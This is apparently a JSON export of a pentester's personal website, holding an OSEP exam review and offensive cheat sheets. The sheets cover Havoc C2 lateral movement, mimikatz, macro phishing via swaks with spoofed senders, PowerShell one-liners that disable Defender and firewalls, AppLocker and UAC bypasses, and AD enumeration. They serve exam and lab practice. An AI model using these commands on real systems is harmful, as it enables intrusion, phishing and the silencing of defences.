{"/about/":{"data":{"":"","other#Other":"\nI’m just a monkey lost in a human’s world. This website is my temple. I type on keyboard, code appears. Sometimes the code works, sometimes it doesn’t. But you can’t blame me. I’m just a monkey in a human’s world.\nMy monkey duties include typing on keyboard, clicking on mouse, hitting computer with wrench until IT comes running. But they can’t get mad, they can’t fire me. I’m just a monkey in a human’s world.\nSometimes I finish cigarette and breath in oxygen. This temporary burst of energy helps me do incredible things, like type on computer fast, break software, make machine go brrrrrrrrrr. And then cigarette comes back, and stops me in my tracks. But you can’t blame me. I’m just a monkey in a human’s world.\n~ fyx(me) - A monkey in a human’s world\ntldr do hack write code type on keyboard loose CTFs against cracked 15 year olds with 80 years of hacking experience self whoami.txtprogrammer, red teamer, pentester, and jack of all trades with a general passion for pretty much anything cyber. certifications Current list of certifications I’ve achieved.\nOffensive Security Experienced Penetration Tester (OSEP) Certified Red Team Operator (CRTO) Certified Red Team Professional (CRTP) Offensive Security Certified Professional (OSCP) CREST Practitioner Security Analyst (CPSA) CREST Registered Penetration Tester (CRT) contact Messages without cute cat or monkey pictures have a higher chance of landing in my spam folder. Do what you will with that information…\nsocials @_fyxme email # email in python def get_email(domain): return \"fegv\" + \"@\" + domain print(get_email(\"proton.me\")) Too hard? Just use this…\nI found this email by bruteforcing protonmail’s username validation endpoint. Couldn’t be bothered to find enough proxies to rotate them and find a valid 3 letter address… Might revisit this in the future.\nwebsite This website is an attempt to document research I do, bugs I find, things I break, tools I make, and useful resources or knowledge I come across. Documenting some of the work I’ve made public.\nThe website is always a work in progress… Your Mileage Will Always Vary.\nsitemap technologies The following tools, libraries and services are used to maintain the website:\nhugo | golang static site generator hextra | hugo theme used as a base (this has been heavily customised and I will most likely fork and divert from it sooner or later) github pages | website hosting cloudflare | domain name renewal (originally registered on namecheap) giphy | da monkee gifs custom python scripts | maintenance, deployment \u0026 other shenanegans to make it compatible with obsidian helpers Finding giphy media url The gif websites are super stingy about sharing their .gif urls… I can never remember how to find it, so here goes nothing:\nTake the url: https://giphy.com/gifs/monkey-phone-cell-l41lVsYDBC0UVQJCE Extract the end bit: l41lVsYDBC0UVQJCE Put the fluff around it: https://media.giphy.com/media/\u003cend bit\u003e/giphy.gif Profit: https://media.giphy.com/media/l41lVsYDBC0UVQJCE/giphy.gif ^ This also works for giphy “clips”\nAlternatively, you can use this “downloader”.\nOther The almighty OG website The Almighty OG Website The OG website was a minimalist single page HTML website which would be updated manually and simply contained redirect links to GitHub Markdown files in various repos.\nThe simplicity of it was great but I wanted something more robust with easy markdown conversion and simple site navigation. Also wanted the content to be hosted and displayed on the fyx.me domain and not in random repos on Github.\nSince the website is a self contained html page its easy to keep around and host.\nIf you want to check it out, it’s available here.\nsimplicity This is the only CSS required to style the whole page. Isn’t that just beautiful…\nbody { font-family: monospace; display: flex; } nav { margin-right: 2em; padding: 1em; } ul { margin: 0; padding-left: 1em; } ul.spaced-list \u003e li { margin-bottom: 1ex; } hr { border: 1px solid gray; margin: 2ex 0; } a { text-decoration: none; } a:hover { text-decoration: underline; } body { background-color: #111; color: #fff; } a { color: #3cf; } a:visited { color: #c6f; } ","self#self":"","tldr#tldr":"","website#website":""},"title":"About fyx(me)"},"/articles/":{"data":{"":" Important\nThe layout of this section is a work in progress. Articles below are new articles I’ve written after migrating to fyx.me v2.0.\nOld articles, CTF/boot2root writeups and post-mortem links can be found at the old website here"},"title":"articles"},"/articles/osep-exam-review/":{"data":{"":"","offsec-osep-exam#Offsec OSEP Exam":"Early December, I attempted the OffSec Experienced Penetration Tester (OSEP) certification exam. I survived a failed computer firmware update, slow and inconsistent internet speeds due to living in a 3rd world country (aka Canada) and a sleeping proctor who took an hour to unfreeze my camera and VPN but in the end…\nI successfully passed the exam! There’s a lot of OSEP reviews out there so I will try to minimise overlap with what overs have said. Use your google fu to find these!\nNevertheless, I’ve compiled a number of tips that will hopefully help you preparing for and taking the OSEP exam.\nPreparation We need to prep for exams? I thought the exam was the prep... Learn to use your tools, especially if you’re using a C2 other than the one taught in the course (ie. Metasploit).\nTJNull has a lot of great suggestions in his OSEP list of vulnerable machines. A lot of these can be used to test your tools in a controlled environment.\nMaking cheatsheets could also be useful especially when you do a lot of these (ie. boot2roots, CTFs or AD environments). Saves you time to just copy paste the commands directly instead of having to run -h / --help every 2 seconds…\nChoice of tools C2 Bazaar\nHavoc quick reference guide\nThe course is centered around Metasploit C2 but use any open source C2 you want and are comfortable with. I used havoc because I wanted to play around with it.\nDon’t be a hero and try to do everything from C2. If you know how to do it from Kali Linux (eg. impacket, netexec, etc) then use that…\nAs long as you have screenshots of retrieving the flag from an interactive shell, you’re gucci.\nAD Enumeration Bazaar\nAD Enumeration quick reference guide\nBloodhound is overrated in these small environments. Plus, the bloodhound client and/or server (depending on which version you are using) is super resource hungry.\nI’d recommend doing manual enumeration using tools like Powerview/powerview.py or adsearch.\nDefence Evasion Important\nYou’re not tested on OPSEC. You can do risky things w/o worrying about OPSEC and whether you should look at less noisy solutions. Just blast things and see what sticks.\nDon’t be scared to disable everything on the environment (eg. firewall, AV, running software), this isn’t production, this isn’t a client’s environment. You’re here to show you understand the vulnerabilities, misconfigurations and can bypass security configurations. If you need to, just revert and if you’re scared add a limitation for the report explaining you did this because you are aware that this is non-production environment and that the “client” (aka offsec) can reset the environment to its original state.\nUse your own time to explore other solutions which do not require disabling defences.\nScreenshot tool Note\nIt’s better to take more then less screenshots… I’d recommend taking fast dirty screenshots, don’t worry about extras and what not, just paste them in your note taking tool like obsidian and reformat them later when writing up the report.\nJust use flameshot, there’s no better alternative.\nYou can also remap your kali and/or host’s machine printscreen button to it.\nMakes your life easier… Simply Screenshot \u003e Edit it from the flameshot popup \u003e Copy \u003e Paste to your favorite editor (eg. Obsidian).\nOther tools You don’t need to do everything from the C2. It’s a free for all, the only requirement is to demonstrate that you have access to the machines in the environment and can reach the flags with an interactive shell, nothing else.\nSo make use of any AD tools you know, including those you can run through proxies (ie. proxychains) like impacket, netexec and powerview.py.\nThe Exam itself Important\nExam completion requirements and tips:\nA total of 100 points (10 points for each proof.txt and/or local.txt flags) OR you reach the end goal and retrieve the secrets.txt file from the target system. Once you reach 100 points, I would focus on ensuring you have all you need for the report (ie. screenshots for the attack paths, valid proof screenshots, notes, etc) and that you have submitted all you flags to the provided control panel. This ensures you don’t forget anything before running out of time. Proof screenshots have a specific format, they need to be taken from an interactive shell and include the (proof|local|secret).txt file contents and the ipconfig of the machine. Also recommended to add whoami in the screenshot because why not (it can help you with write ups later on). You do not need to use a C2 for everything in the exam. The only requirement is that you have screenshots of the flags from an interactive shell. So you can exploit the machine and then drop a beacon on there for example to take your screenshot. Completion txt files :\nproof.txt, local.txt - located on User’s home folder, or other publicly reachable folders. secrets.txt (its the last box on the environment so don’t just count on that to pass… if you’re stuck on one path, check the other paths.) In my opinion, the exam is a lot more straightforward / linear then you think compared to the OSCP.\nTake time to eat/sleep/shower/talk to friends (lol imagine having friends and taking a 3 day proctored exam).\nMake sure to read the OSEP Exam Guide and OSEP Exam FAQ in details before the exam.\nProctoring Caution\nDon’t forget a government issued ID to show to the proctor when the exam starts (don’t do like i did and panic to find any form of government id when they requested it…)\nFor the proctoring tool, I had to disable Wayland on Debian Linux because it was interfering with screen sharing (ie. could only share full screen and not individual screens).\nI lost close to 1 hour at the beginning because of this. I was told that if I could not get the proctoring tools working within the hour, they will end my exam and cancel it (ie. same as did not attend).\nHence, I would highly recommend that you test screen sharing to ensure you can share all your screens individually before the start of the exam. (And install the required extension if you end up using brave or chrome)…\nI ended using brave with the Offsec memory hogging screenshare extension… Now that I’ve read more OSEP reviews, I should have tried with firefox after I fixed my Wayland issue.\nTldr\nUse firefox. If you can only share your full screen and are running linux, it’s probably a Wayland issue (check online for fixes). If that doesn’t work, see if using brave with the screen share plugin works.\nAs with all OSEP exams, don’t worry about crashes (VPN, VM, Computer, Proctoring tool, etc). Just message them in the chat explaining what happened (ie. poor software and/or hardware, shit crashes). They’re usually pretty ok with it. Just restart, reshare and explain what happened.\nIf the proctor is not responding then contact them via this chat. When I had issue and my proctor wasn’t responding for like 1 hour and I needed them to unfreeze the webcam/VPN, I messaged them here and someone answered pretty much straight away and nudged the proctor to respond to me and fix my environment.\nThe dev Windows VM They give you a Windows virtual machine that is configured with all the tools required for writing and compiling c sharp, office macros, etc. Machine has Defender disabled, all the tools you need and has quite a lot of hardware resources.\nIt’s probably the fastest machine in the environment… I recommend to make use of it unless you run your own Windows VM where you can do those kind of things easily. Credentials are on the internal exam control panel.\nThe Exam Report You have 24 hours to finalise and send your report after the exam ends. Make sure you follow the instructions on how to send your report properly (ie. 7z without password, submit on that portal, etc).\nIf you took notes and a lot of screenshots during the exam, this should be a breeze and the formatting should be the most time consuming part.\nI personally used the following offsec exam markdown report template which has some nice report layouts and allows you to take notes in Markdown and generate the final PDF report directly without having to touch MS Word.\nWarning\nWhen installing the Eisvogel latex template with that Offsec Markdown template, don’t use the v2.5 of the Eisvogel latex template because its bugged for images and will not resize/center them properly.\nRef: https://github.com/Wandmalfarbe/pandoc-latex-template/issues/405 Ref2: https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/issues/63\nIf you decide to use that tool, be wary that you may need some bash magic to convert links and other things that might break during conversion. You can look at the Github issues on the repo to look for help but if you’re not confident you can fix the formatting yourself quickly then I wouldn’t recommend it and suggest using the Offsec Word Document instead.\nOnce you’ve submitted the report, you can finally start cleaning up, respond to everyone you ghosted over the past few days and get back to scrolling twitter and watching anime while you wait for Offsec’s email response.\nFamous last words One thing that always amazes me in these long exams is that you can get an insane amount of stuff done, learned and researched in just 48 hours when you disregard all other life distractions and become a hermit.\nProbably not good in the long term but interesting food for thought…\nGood Luck Comrade! "},"title":"OffSec Experienced Penetration Tester (OSEP) Exam Review"},"/bazaar/":{"data":{"":" Warning\nThe bazaar is at a very early stage. Anything and everything may change for better or worse.\nA bazaar or souk is a marketplace consisting of multiple small stalls or shops, especially in the Middle East, the Balkans, Central Asia, North Africa and South Asia. They are traditionally located in vaulted or covered streets that have doors on each end and served as a city’s central marketplace.\nIn other terms, the cyber bazaar is a place for structured chaos where you can (sometimes) find cyber things you need (and sometimes stuff you don’t need).\nA wiki / cheatsheet combination of some sorts with some magic dust sprinkled in there.\nImportant\nThe goal is to have quick references to various tools and knowledge that is helpful for cybersecurity, speedrunning ctfs/boot2root/certs and other useful programming knowledge.\nA lot of the techniques described here are very noisy and might not be OPSEC safe. Tread with caution and do your own research if you want to utilise some of the techniques during pentesting or red teaming engagements.","faq#FAQ":"Will I find everything I need here? No\nAt what stage of completion is this? Eternal work in progress\nWhy make yet another cybersecurity cheatsheet? I like the stock\nWhere did you get the image? Yonked it at gunpoint from an AI on the internet."},"title":"bazaar"},"/bazaar/c2/":{"data":{"":"","#":" Tbd\nPivoting does your ticket have network permissions? sometimes easier to use ptt to pass the ticket or steal a token from the machine that has network privilege on behalf of the machine "},"title":"_index"},"/bazaar/c2/havoc/":{"data":{"":"","#":" Note\nC5Spider (the Author) is currently doing a re-write of Havoc which will most likely improve it’s capabilities and stability. See the havoc repo’s rewrite branch for more details.\nHavoc is still a new C2 framework and has some limitations, things it cannot do and things that may break. Also the havoc client can be a little resource hungry… During OSEP Exam, my VM crashed a few times because of it or the havoc client process was killed. Also had computer crashes but that is most likely a combination of this and Offsec’s proctoring extension.\nCommands # https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD#commands # ~~~ Non-exhaustive list below ~~~ # fork and run. nice to start a second beacon in case the first one dies or something shellcode spawn x64 /payloads/demon.x64.bin # ADCS adcs_enum # Kerberoasting get-spns kerberoast \u003cspn\u003e # run PE inline (exe) - builtin to Havoc - https://github.com/fortra/No-Consolation noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess # Socks Proxy socks add 4242 # dont forget to edit your /etc/proxychains4.conf proxychains4 netexec smb dc01.pinecorp.local -u deamian -p Winter2000 -M gpp_autologin -M gpp_password # port forwarding (usefull to forward a webserver or something) # w/o for firewall settings on the beacon's host rportfwd .... # enum local sessions enumlocalsessions sessions quser schtaskenum netview klist # dir remote share and cat content of file dir \"\\\\dc01.pinecorp.local\\SYSVOL\" cat \"\\\\dc01.pinecorp.local\\SYSVOL\\pinecorp.local/Policies/{EA980932-BE55-11EF-B70F-579199F31135}/Machine/Preferences/Registry/Registry.xml\" # lateral movement # requires LatLoader bof: https://github.com/icyguider/LatLoader # trkwks4185 is the name of your pipe as defined in your SMB listener config LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin pivot connect dev01.pinecorp.local trkwks4185 Modules LatLoader (Lateral Movement) LatLoader | LatLoader is a PoC module to demonstrate automated lateral movement with the Havoc C2 framework. # lateral movement LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin # dont forget to connect to host if you used an smb beacon pivot connect dev01.pinecorp.local trkwks4185 Shhhhloader (Obfuscated Dropper) Shhhhloader | Syscall Shellcode Loader Decent obfuscation tool. However, can sometimes break because of obscure havoc profile configurations…\nUse the GUI button in the navbar to generate your payload.\nWarning\nThe tool currently doesn’t support grabbing the payloads from the listeners directly. You have to generate them prior and upload them via the file input in the GUI.\nUAC-BOF-Bonanza (UAC Bypass BOF) UAC-BOF-Bonanza Tbd\nUntested but look interesting\nHighBorn (UAC Bypass BOF) HighBorn Tbd\nUntested but look interesting\nPre-compiled binaries # run PE inline (non C# exe) noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute (C# exe) dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess Dotnet C# binaries:\nhttps://github.com/r3motecontrol/Ghostpack-CompiledBinaries https://github.com/Flangvik/SharpCollection Havoc Profiles Warning\nI’ve had issues with listeners not working properly and not binding correctly. I recommend adding the listeners to your profile directly and if you have to modify or update one, do it from the profile config file and restart the server. (You will not loose your data… but beacons might die if you change the communication protocols, ports etc…)\npython3 havoc_profile_generator.py Ref: https://github.com/Ghost53574/havoc_profile_generator\nLimitations Havoc doesn’t support import-powershell so you need to do it yourself when running a powershell command:\npowershell import-module C:\\windows\\tasks\\somemodule.ps1; Invoke-ModuleCMD Ref: https://github.com/HavocFramework/Havoc/issues/492#issuecomment-2198213157"},"title":"Havoc"},"/bazaar/computer-science-programming--software-engineering/":{"data":{"":""},"title":"_index"},"/bazaar/computer-science-programming--software-engineering/orchestration-workflows/":{"data":{"":"","#":"Workflow orchestration tldr: A fancy cron runner with advanced workflow management, status monitoring, alerting, etc…\nCyber security use cases:\nMonitoring tasks Scheduled offensive/defensive scan triggers Daily Enumeration workflows data pipelines and more… Prefect Prefect offers modern orchestration solutions to empower data teams to build resilient workflows that scale with versatile resource needs.\nRef: https://www.prefect.io/\nApache Airflow Apache Airflow® is a platform created by the community to programmatically author, schedule and monitor workflows.\nRef: https://airflow.apache.org/\nDifference between CI-CD runners and Workflow orchestrators Difference between CI-CD runners like Github actions and Workflow orchestrators like Airflow and Perfect?\nAs to the differences, GitHub actions is generally a “on commit, do something”, like build an image, run tests, linting, build documentation, etc. It’s a tool generally to automate actions on your repository.\nAirflow and Prefect are orchestration systems. They’re not tied to a repo and can do a wider variety of things. For example, every day at 4am run a daily report for the prior business day. Every weekend retain our ML models by spinning up some Amazon ECS tasks. Every half an hour hit an external API and digest it’s data into our data lake.\n[…] GitHub actions… Can be shoehorned to do orchestration in a limited fashion, but it’s not quite the intent.\nPrefect and airflow are, however, explicitly designed to do it. For Prefect, that means I dictate how things are run (containers, dask workers, other), I can specific what to happen on failure (retry, pagerduty alert, slack warnings, etc), and many other things that in general make my life easier bridging the proof of concept to fully productionised system easier.\nRef: https://www.reddit.com/r/mlops/comments/13ulfux/airflow_vs_github_actions_workflows/"},"title":"orchestration (workflows)"},"/bazaar/linux/system-hardening/":{"data":{"":"","#":"OpenSnitch OpenSnitch is a GNU/Linux interactive application firewall inspired by Little Snitch. Ref: https://github.com/evilsocket/opensnitch\nWarning\nappindicators which is required for the system tray icon is buggy and seems to produce a lot of syslog errors: journalctl --since \"1 hour ago\"\nRecommend installing and using Tray Icons: Reloaded instead: https://extensions.gnome.org/extension/2890/tray-icons-reloaded/\nNote\nWorks more or less with VPNs… YMMV.\nOther speedup configs Caution\nTread at your own risk… A lot of these things can fuck-up your device and might be annoying to undo or fix easily. But we all have installation scripts and backups right…. right?!\nMonitor journalctl --since \"1 hour ago\" for bugs and application errors which might use up battery, or other hardware resources. Need to run as admin to see all messages otherwise you will only see logs related to your system.\ngnome-shell editor: dconf-editor\nTo look into:\nhttps://askubuntu.com/questions/346211/tracker-store-and-tracker-miner-fs-eating-up-my-cpu-on-every-startup Hardening scripts debian-cis Warning\nSome of these may not be desirable to have hardened on host machines.\nRef: https://github.com/ovh/debian-cis\n# Installation # need root to cp into /etc/default/cis-hardening cd debian-cis cp debian/default /etc/default/cis-hardening sed -i \"s#CIS_LIB_DIR=.*#CIS_LIB_DIR='$(pwd)'/lib#\" /etc/default/cis-hardening sed -i \"s#CIS_CHECKS_DIR=.*#CIS_CHECKS_DIR='$(pwd)'/bin/hardening#\" /etc/default/cis-hardening sed -i \"s#CIS_CONF_DIR=.*#CIS_CONF_DIR='$(pwd)'/etc#\" /etc/default/cis-hardening sed -i \"s#CIS_TMP_DIR=.*#CIS_TMP_DIR='$(pwd)'/tmp#\" /etc/default/cis-hardening # Audit everything ./bin/hardening.sh --audit-all # audit single item ./bin/hardening/4.4_logrotate_permissions.sh --audit # Apply a fix / harden ./bin/hardening/4.4_logrotate_permissions.sh --apply "},"title":"system hardening"},"/bazaar/other-cheatsheets/":{"data":{"":"","#":"General https://www.thehacker.recipes/ (Better than hacktricks imo) https://viperone.gitbook.io/pentest-everything (great for AD stuff) hacktricks https://www.ired.team/ - always find gems in here. More oldschool but pretty awesome and well explained https://exploit-notes.hdks.org/ (found when looking for something specific, looks interesting) https://watchdogsacademy.gitbook.io/attacking-active-directory (found when looking at mssql stuff, also has cool shit I think) Mindmaps https://orange-cyberdefense.github.io/ocd-mindmaps/ (It looks cool but I’ve honestly never used this…) "},"title":"++ cyber cheatsheets"},"/bazaar/phishing/":{"data":{"":"","#":" Warning\nWIP… Only added basic commmands now that seem to work quite well for test environments with basic security controls aka MS Defender AV.\nThese most likely wont work against any EDR solution… DYOR.\nWord Macros Important\ndocx word docs don’t execute macros (they may be contained in the document but in read only mode), create a docm or doc instead\nFocus on hta, docm, and js payloads\nMacro pack MacroPack Community is a tool used to automatize obfuscation and generation of retro formats such as MS Office documents or VBS like format. It also handles various shortcuts formats.\n# List all supported file formats macro_pack.exe --listformats # List all available templates macro_pack.exe --listtemplates # Craft a payload ... Note\nThe EmbedExe template has been quite good in the past as it allows you to provide you C2 payload directly via exe or bin , utilising either a smb beacon or http beacon.\nWhen using the smb beacon, you can try and spray the network to guess if its running or not\nSending Emails: swaks To send emails to a mail service (eg. SMTP, IMAP, etc) from the command line, swaks is your go to tool.\nIt provides nice features for attaching documents, spoofing senders, etc.\nSending emails with payloads as attachments # links in body can be used if the user is going to click on it # otherwise you can also attach files to it # --server : mail server # --attach @totally-not-malicious.docm : attach the file name `totally-not-malicious.docm` to the email # --suppress-data : don't print the attachment back to you swaks --from vladimir.putin@target.com --to sam.altman@target.com --header 'Subject: Company Notification' --body 'Hi Sam, we want to hear from you! Please complete the following survey. https://mywebsite.com/mysurvey.hta' --server 10.10.10.10 --attach @totally-not-malicious.docm --suppress-data Refs https://github.com/cymerkabrol/doc-macro-exploit https://github.com/itm4n/VBA-RunPE https://github.com/sevagas/macro_pack https://github.com/Inf0secRabbit/BadAssMacros "},"title":"Phishing"},"/bazaar/windows/":{"data":{"":""},"title":"Windows"},"/bazaar/windows/active-directory/":{"data":{"":"Other tools:\nenum4linux-ng "},"title":"Active Directory"},"/bazaar/windows/active-directory/ad-enumeration/":{"data":{"":"","#":" Note\nMachine accounts are Domain accounts and can be used to authenticate and talk to LDAP.\nAD enumeration with powerview / powerview.py # Get all users in the current domain Get-DomainUser | select -ExpandProperty cn # Get all computers in the current domain Get-DomainComputer # Get all domains in current forest Get-ForestDomain # Get domain/forest trusts Get-DomainTrust Get-ForestTrust # Get information for the DA group Get-DomainGroup \"Domain Admins\" # Find members of the DA group Get-DomainGroupMember \"Domain Admins\" | select -ExpandProperty membername # Find interesting shares in the domain, ignore default shares, and check access Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC -CheckShareAccess # Get OUs for current domain Get-DomainOU -FullData # Get computers in an OU # %{} is a looping statement Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname # Get GPOs applied to a specific OU Get-DomainOU *WS* | select gplink Get-DomainGPO -Name \"{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}\" # Get Restricted Groups set via GPOs, look for interesting group memberships forced via domain Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers # Get the computers where users are part of a local group through a GPO restricted group Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName # Find principals that can create new GPOs in the domain Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=targetdomain,DC=com\" -ResolveGUIDs | ?{ $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier # Find principals that can link GPOs to OUs Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier # Get incoming ACL for a specific object Get-DomainObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights # Find interesting ACLs for the entire domain, show in a readable (left-to-right) format Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains \"DnsAdmins\"} | ft # Get interesting outgoing ACLs for a specific user or group # ?{} is a filter statement Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match \"Domain Admins\"} | select ObjectDN,ActiveDirectoryRights Powerview from Linux System: powerview.py PowerView.py is an alternative for the awesome original PowerView.ps1 script. Most of the modules used in PowerView are available here ( some of the flags are changed ). Main goal is to achieve interactive session without having to repeatedly authenticate to ldap.\nRef: https://github.com/aniqfakhrul/powerview.py\nWarning\nIt might not return all properties by default, recommended to run all commands with -Properties * to get all the details like LAPS password for machines (if you have the perms) or delegation metadata like msDS-AllowedToActOnBehalfOfOtherIdentity\n# running over proxychains and using powerview to connect to LDAP of dc01.pinecorp.internal proxychains4 -q powerview 'john.doe':'AmazingP@ss'@dc01.pinecorp.internal --use-ldap -ns 10.10.10.10 # supports some functionality to help with OPSEC... althought never tested so not sure what they do --no-admin-check Skip admin check when first logging in --obfuscate Obfuscate search filter Modules available: https://github.com/aniqfakhrul/powerview.py?tab=readme-ov-file#module-available-so-far\nADSearch # List users execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"objectCategory=user\" # List admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=*Admins))\" # List MS SQL Admins execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=group)(cn=MS SQL Admins))\" --attributes cn,member # kerberoasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName # as-rep roasting execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname # unconstrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname # constrained delegation execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(\u0026(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json "},"title":"AD Enumeration"},"/bazaar/windows/active-directory/lateral-movement/":{"data":{"":"","#":"WinRm : Enter-PSSession / evil-winrm ports: 5985 (HTTP) and 5986 (HTTPS) (Below Windows 7: 80 and 443) # finding open ports nmap -p5985,5986 -iL computers.txt -Pn -v # Connect from Linux evil-winrm -i Server01 -u USER -p PASS # Connect from Windows Enter-PSSession Server01 # automation (python3) # pip install pywinrm # (see ref for optional deps) # ref: https://pypi.org/project/pywinrm/ import winrm sess = winrm.Session( '10.10.10.10', auth=( 'administrator', 'badminton' ), transport='ntlm' ) # run powershell command r = session.run_ps(\"whoami\") print(r.std_out) print(r.std_err) # run print(session.run(\"type c://users//mike//Desktop//flag.txt\").std_out) About WinRm Using the WS-Management protocol, Windows PowerShell remoting lets you run any Windows PowerShell command on one or more remote computers.\nTo start an interactive session with a single remote computer, use the Enter-PSSession cmdlet. For example, to start an interactive session with the Server01 remote computer, type:\nEnter-PSSession Server01 ~ Microsoft Docs1\nMicrosoft has implemented the WS-Management standard in Windows Remote Management 1.1 (WinRM)\nBy default WinRM HTTP uses port 80 and HTTPS uses port 443. On Windows 7 and higher the default ports are 5985 and 5986, respectively. ~ Wikipedia2\nhttps://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands?view=powershell-7.4#windows-powershell-remoting ↩︎\nhttps://en.wikipedia.org/wiki/WS-Management ↩︎"},"title":"Lateral Movement"},"/bazaar/windows/active-directory/mssql/":{"data":{"":" Tbd\nimpacket-mssqlclient https://github.com/lefayjey/SharpSQLPwn https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet https://watchdogsacademy.gitbook.io/attacking-active-directory/mssql-servers-exploitation/mssql-trusted-links https://github.com/quentinhardy/msdat "},"title":"MSSQL"},"/bazaar/windows/defence-evasion/":{"data":{"":"","#":" Caution\nOnly use these in controlled test environments which can be reset easily (eg. CTFs, boot2root, Offsec Exams)\nDisabling defences Disable defender, all firewall rules and set execution policy to unrestricted:\nSet-ExecutionPolicy Unrestricted;Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference; Execution Policy blocking commands powershell -noexit -ExecutionPolicy Bypass [optional cmd you wish to run] # show execution policy Get-ExecutionPolicy # remove execution policy Set-ExecutionPolicy Unrestricted Firewall # Disable all Firewall profiles (Requires Admin privileges). Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False Set-NetFirewallProfile -Enabled False Defender # Turn off everything and set exclusion to \"C:\\Windows\\Temp\" Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference # ----- # Check if Defender is enabled Get-MpComputerStatus Get-MpComputerStatus | Select AntivirusEnabled # Check if defensive modules are enabled Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL # Check if tamper protection is enabled Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL # ----- # Disables realtime monitoring Set-MpPreference -DisableRealtimeMonitoring $true # Disables scanning for downloaded files or attachments Set-MpPreference -DisableIOAVProtection $true # Disable behaviour monitoring Set-MPPreference -DisableBehaviourMonitoring $true # Make exclusion for a certain folder Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\" # Disables cloud detection Set-MPPreference -DisableBlockAtFirstSeen $true # Disables scanning of .pst and other email formats Set-MPPreference -DisableEmailScanning $true # Disables script scanning during malware scans Set-MPPReference -DisableScriptScanning $true # Exclude files by extension Set-MpPreference -ExclusionExtension \"ps1\" Ref: https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender#firewall\nAppLocker C:\\windows\\tasks C:\\Windows\\System32\\spool\\drivers\\color Ref: https://github.com/api0cradle/UltimateAppLockerByPassList/tree/master?tab=readme-ov-file\nUAC Bypass The repo below has a great list of UAC bypasses to use in various condition (GUI, DLL hijack, etc). Easily modifiable to create a BOF or tool which does the same thing.\nDefeating Windows User Account Control Ref: https://github.com/hfiref0x/UACME"},"title":"Defence Evasion"},"/bazaar/windows/misc-snippets/":{"data":{"":"","other-useful-commands#Other useful commands":"Windows # Windows useful commands # list named pipes ls \\\\.\\pipe\\ # Find all shares, List share content and cat remote file on a share net view \\\\10.10.10.10 /all Get-SmbShare -CimSession \"10.10.10.10\" IncludeHidden ls \\\\10.10.10.10\\SYSVOL\\ cat \\\\10.10.10.10\\public\\asdf.txt # shares on local machines net shares Get-SMBShare -IncludeHidden Linux # quick way to get all IPs for computers on the domain from a list of domain names # replace 10.10.10.10 with the DNS server (most likely the domain controller) proxychains4 -q bash -c 'for computer in `cat computers.txt`; do dig +noall +answer +tcp @10.10.10.10 \"$computer\" ; done' | tee dig-computers.txt ","running-tools-from-non-domain-joined-machines#Running tools from Non-Domain Joined Machines":" Note\nTools may require 